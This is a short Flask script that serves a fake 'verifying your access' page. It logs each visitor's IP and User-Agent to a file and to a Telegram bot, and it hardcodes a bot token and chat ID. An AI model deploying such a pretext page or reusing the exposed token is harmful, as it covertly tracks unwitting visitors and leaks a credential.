from flask import Flask, request, render_template_string
from datetime import datetime
import requests

app = Flask(__name__)

# Configura tu bot aquí
TELEGRAM_TOKEN = '8055178101:AAGWM1JVaAuZmaJIYL9dQnpoycE3Qh9y8pk'
TELEGRAM_CHAT_ID = '759863630'

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Verificación</title>
</head>
<body>
    <h2>Estamos verificando tu acceso</h2>
    <p>Espera un momento mientras validamos tu identidad...</p>
</body>
</html>
"""

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print("Error enviando a Telegram:", e)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = f"[{timestamp}] IP: {ip}, User-Agent: {user_agent}"
    print(log_entry)

    # Guardar en archivo local
    with open("honeypot_log.txt", "a") as log_file:
        log_file.write(log_entry + "\n")

    # Enviar a Telegram
    send_telegram_message(log_entry)

    return render_template_string(HTML)

# Ejecutar el servidor en Replit
app.run(host='0.0.0.0', port=81)

